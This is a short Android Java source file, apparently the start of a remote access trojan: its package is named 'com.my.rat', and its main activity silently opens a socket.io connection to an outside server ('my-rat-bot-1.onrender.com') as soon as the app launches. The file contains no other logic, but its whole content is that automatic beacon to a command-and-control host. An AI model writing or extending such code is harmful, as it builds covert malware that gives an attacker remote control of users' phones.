package com.my.rat;

import android.app.Activity;
import android.os.Bundle;
import io.socket.client.IO;
import io.socket.client.Socket;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            Socket socket = IO.socket("https://my-rat-bot-1.onrender.com");
            socket.connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
